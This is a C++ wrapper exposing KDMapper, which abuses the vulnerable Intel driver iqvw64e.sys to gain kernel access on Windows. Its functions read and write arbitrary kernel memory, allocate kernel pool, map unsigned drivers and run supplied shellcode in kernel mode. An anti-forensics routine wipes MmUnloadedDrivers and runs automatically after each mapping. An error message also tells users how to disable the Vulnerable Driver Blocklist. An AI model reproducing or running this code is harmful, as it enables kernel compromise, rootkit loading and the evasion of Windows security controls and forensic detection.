//! KDMapper C++ Wrapper Implementation
//!
//! Implementation of C-compatible wrapper functions for KDMapper.

#include "kdmapper_wrapper.hpp"
#include "../kdmapper/kdmapper.hpp"
#include "../kdmapper/intel_driver.hpp"
#include "../kdmapper/service.hpp"
#include "../kdmapper/utils.hpp"
#include <string>
#include <vector>

// ============================================================================
// Global State
// ============================================================================

static std::string g_last_error;
static HANDLE g_device_handle = nullptr;
static bool g_intel_driver_loaded = false;

// ============================================================================
// Helper Functions
// ============================================================================

static void set_last_error(const char* error) {
    g_last_error = error;
}

static void set_last_error_fmt(const char* fmt, ...) {
    char buffer[512];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buffer, sizeof(buffer), fmt, args);
    va_end(args);
    g_last_error = buffer;
}

// ============================================================================
// Intel Driver Management
// ============================================================================

bool kdmapper_is_running(void) {
    return intel_driver::IsRunning();
}

KDMapperDevice* kdmapper_load_intel_driver(const char* driver_path) {
    if (g_intel_driver_loaded) {
        set_last_error("Intel driver already loaded");
        return nullptr;
    }

    // Fail early if the Windows Vulnerable Driver Blocklist will reject iqvw64e.sys.
    // On Windows 11 24H2+ this is enabled by default and causes STATUS_IMAGE_CERT_REVOKED.
    if (kdmapper_check_blocklist()) {
        set_last_error(
            "Windows Vulnerable Driver Blocklist is enabled - iqvw64e.sys will be blocked. "
            "Disable: HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config -> "
            "VulnerableDriverBlocklistEnable = 0, then fully power off and restart "
            "(not just Restart - Fast Startup caches the old setting)."
        );
        return nullptr;
    }

    std::string driver_path_str = driver_path ? driver_path : "iqvw64e.sys";

    // Check if driver exists
    if (driver_path && !std::filesystem::exists(driver_path_str)) {
        set_last_error_fmt("Driver file not found: %s", driver_path);
        return nullptr;
    }

    // Load the Intel driver
    g_device_handle = intel_driver::Load();
    if (!g_device_handle || g_device_handle == INVALID_HANDLE_VALUE) {
        set_last_error("Failed to load Intel driver");
        return nullptr;
    }

    g_intel_driver_loaded = true;

    // Return a dummy handle (we use the global g_device_handle internally)
    static KDMapperDevice dummy_handle;
    return &dummy_handle;
}

void kdmapper_unload_intel_driver(KDMapperDevice* handle) {
    if (!g_intel_driver_loaded) {
        return;
    }

    if (g_device_handle && g_device_handle != INVALID_HANDLE_VALUE) {
        intel_driver::Unload(g_device_handle);
    }

    g_device_handle = nullptr;
    g_intel_driver_loaded = false;
}

// ============================================================================
// Memory Operations
// ============================================================================

bool kdmapper_read_memory(
    KDMapperDevice* handle,
    uint64_t address,
    uint8_t* buffer,
    uint64_t size
) {
    if (!g_intel_driver_loaded || !g_device_handle) {
        set_last_error("Intel driver not loaded");
        return false;
    }

    if (!address || !buffer || !size) {
        set_last_error("Invalid parameters");
        return false;
    }

    return intel_driver::ReadMemory(g_device_handle, address, buffer, size);
}

bool kdmapper_write_memory(
    KDMapperDevice* handle,
    uint64_t address,
    const uint8_t* buffer,
    uint64_t size
) {
    if (!g_intel_driver_loaded || !g_device_handle) {
        set_last_error("Intel driver not loaded");
        return false;
    }

    if (!address || !buffer || !size) {
        set_last_error("Invalid parameters");
        return false;
    }

    return intel_driver::WriteMemory(g_device_handle, address, const_cast<uint8_t*>(buffer), size);
}

bool kdmapper_set_memory(
    KDMapperDevice* handle,
    uint64_t address,
    uint32_t value,
    uint64_t size
) {
    if (!g_intel_driver_loaded || !g_device_handle) {
        set_last_error("Intel driver not loaded");
        return false;
    }

    if (!address || !size) {
        set_last_error("Invalid parameters");
        return false;
    }

    return intel_driver::SetMemory(g_device_handle, address, value, size);
}

// ============================================================================
// Pool Allocation
// ============================================================================

uint64_t kdmapper_allocate_pool(
    KDMapperDevice* handle,
    uint32_t pool_type,
    uint64_t size
) {
    if (!g_intel_driver_loaded || !g_device_handle) {
        set_last_error("Intel driver not loaded");
        return 0;
    }

    if (!size) {
        set_last_error("Invalid size");
        return 0;
    }

    return intel_driver::AllocatePool(g_device_handle, static_cast<nt::POOL_TYPE>(pool_type), size);
}

bool kdmapper_free_pool(
    KDMapperDevice* handle,
    uint64_t address
) {
    if (!g_intel_driver_loaded || !g_device_handle) {
        set_last_error("Intel driver not loaded");
        return false;
    }

    if (!address) {
        set_last_error("Invalid address");
        return false;
    }

    return intel_driver::FreePool(g_device_handle, address);
}

// ============================================================================
// Driver Mapping
// ============================================================================

bool kdmapper_map_driver(
    KDMapperDevice* handle,
    const char* driver_path,
    uint64_t* out_base_address,
    uint64_t* out_image_size,
    uint64_t* out_entry_point,
    uint32_t* out_status
) {
    if (!g_intel_driver_loaded || !g_device_handle) {
        set_last_error("Intel driver not loaded");
        return false;
    }

    if (!driver_path || !out_base_address || !out_image_size || !out_entry_point || !out_status) {
        set_last_error("Invalid output parameters");
        return false;
    }

    std::string driver_path_str(driver_path);
    if (!std::filesystem::exists(driver_path_str)) {
        set_last_error_fmt("Driver file not found: %s", driver_path);
        return false;
    }

    // Initialize outputs
    *out_base_address = 0;
    *out_image_size = 0;
    *out_entry_point = 0;
    *out_status = 0;

    // Map the driver
    uint64_t base_address = kdmapper::MapDriver(g_device_handle, driver_path_str);

    if (!base_address) {
        set_last_error("Failed to map driver");
        return false;
    }

    // Get NT headers to find image size and entry point
    std::vector<uint8_t> raw_image;
    if (!utils::ReadFileToMemory(driver_path_str, &raw_image)) {
        set_last_error("Failed to read driver file");
        return false;
    }

    const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(raw_image.data());
    if (!nt_headers) {
        set_last_error("Invalid PE image");
        return false;
    }

    *out_base_address = base_address;
    *out_image_size = nt_headers->OptionalHeader.SizeOfImage;
    *out_entry_point = base_address + nt_headers->OptionalHeader.AddressOfEntryPoint;

    // Note: MapDriver doesn't return the actual NTSTATUS from DriverEntry.
    // Set STATUS_SUCCESS (0x00000000).
    *out_status = 0;

    // Post-map cleanup: remove the Intel driver's entry from MmUnloadedDrivers.
    // This reduces the forensic window that PatchGuard uses to detect manually
    // mapped drivers. Done automatically so callers don't have to remember.
    if (!intel_driver::ClearMmUnloadedDrivers(g_device_handle)) {
        // Non-fatal: log but don't fail the mapping operation.
        set_last_error("Warning: ClearMmUnloadedDrivers failed after successful map");
    }

    return true;
}

// ============================================================================
// Shellcode Execution
// ============================================================================

bool kdmapper_execute_shellcode(
    KDMapperDevice* handle,
    const uint8_t* shellcode,
    uint32_t shellcode_size,
    uint32_t timeout_ms,
    uint64_t* out_result
) {
    if (!g_intel_driver_loaded || !g_device_handle) {
        set_last_error("Intel driver not loaded");
        return false;
    }

    if (!shellcode || !shellcode_size || !out_result) {
        set_last_error("Invalid parameters");
        return false;
    }

    // Allocate kernel memory for shellcode
    uint64_t shellcode_addr = intel_driver::AllocatePool(
        g_device_handle,
        nt::NonPagedPool,
        shellcode_size
    );

    if (!shellcode_addr) {
        set_last_error("Failed to allocate kernel memory for shellcode");
        return false;
    }

    // Write shellcode to kernel memory
    if (!intel_driver::WriteMemory(
        g_device_handle,
        shellcode_addr,
        const_cast<uint8_t*>(shellcode),
        shellcode_size
    )) {
        intel_driver::FreePool(g_device_handle, shellcode_addr);
        set_last_error("Failed to write shellcode to kernel memory");
        return false;
    }

    // Execute shellcode
    uint64_t result = 0;
    bool success = intel_driver::CallKernelFunction(
        g_device_handle,
        &result,
        shellcode_addr
    );

    // Free shellcode memory
    intel_driver::FreePool(g_device_handle, shellcode_addr);

    if (!success) {
        set_last_error("Failed to execute shellcode");
        return false;
    }

    *out_result = result;
    return true;
}

// ============================================================================
// Module Information
// ============================================================================

uint64_t kdmapper_get_module_base(
    KDMapperDevice* handle,
    const char* module_name
) {
    if (!g_intel_driver_loaded || !g_device_handle) {
        set_last_error("Intel driver not loaded");
        return 0;
    }

    if (!module_name) {
        set_last_error("Invalid module name");
        return 0;
    }

    return utils::GetKernelModuleAddress(std::string(module_name));
}

uint64_t kdmapper_get_module_export(
    KDMapperDevice* handle,
    uint64_t module_base,
    const char* function_name
) {
    if (!g_intel_driver_loaded || !g_device_handle) {
        set_last_error("Intel driver not loaded");
        return 0;
    }

    if (!module_base || !function_name) {
        set_last_error("Invalid parameters");
        return 0;
    }

    return intel_driver::GetKernelModuleExport(
        g_device_handle,
        module_base,
        std::string(function_name)
    );
}

// ============================================================================
// Anti-Forensics
// ============================================================================

bool kdmapper_clear_unloaded_drivers(KDMapperDevice* handle) {
    if (!g_intel_driver_loaded || !g_device_handle) {
        set_last_error("Intel driver not loaded");
        return false;
    }

    return intel_driver::ClearMmUnloadedDrivers(g_device_handle);
}

// ============================================================================
// Environment Validation
// ============================================================================

bool kdmapper_check_blocklist(void) {
    HKEY hKey = nullptr;
    LONG result = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Control\\CI\\Config",
        0,
        KEY_READ,
        &hKey
    );
    if (result != ERROR_SUCCESS) {
        // Key absent means the blocklist is not configured - safe to proceed.
        return false;
    }

    DWORD value = 0;
    DWORD size  = sizeof(DWORD);
    DWORD type  = REG_DWORD;
    result = RegQueryValueExA(
        hKey,
        "VulnerableDriverBlocklistEnable",
        nullptr,
        &type,
        reinterpret_cast<LPBYTE>(&value),
        &size
    );
    RegCloseKey(hKey);

    if (result != ERROR_SUCCESS) {
        return false;
    }
    return value != 0;
}

// ============================================================================
// Utility Functions
// ============================================================================

const char* kdmapper_get_last_error(void) {
    return g_last_error.c_str();
}
